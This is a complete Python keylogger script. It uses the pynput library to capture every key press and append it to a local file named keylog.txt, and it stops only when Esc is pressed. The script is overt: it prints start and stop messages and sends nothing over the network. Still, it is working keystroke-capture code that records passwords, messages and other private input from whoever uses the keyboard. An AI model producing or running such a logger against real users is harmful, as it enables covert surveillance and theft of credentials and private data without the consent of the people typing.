#!/usr/bin/env python3

from pynput.keyboard import Key, Listener

# The file to which keystrokes will be logged
log_file = "keylog.txt"

def on_press(key):
    """Handles key press events."""
    try:
        if hasattr(key, 'char'):
            char = key.char
        elif key == Key.space:
            char = ' '
        else:
            char = f' <{key.name}> '
            
        with open(log_file, "a") as f:
            f.write(char)

    except Exception as e:
        print(f"Error while writing to file: {e}")

def on_release(key):
    """Handles key release events."""
    if key == Key.esc:
        print("\nStopping keylogger...")
        return False

def main():
    """Starts the keylogger and logs keystrokes."""
    print("Starting keylogger... (Press 'Esc' to stop)")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()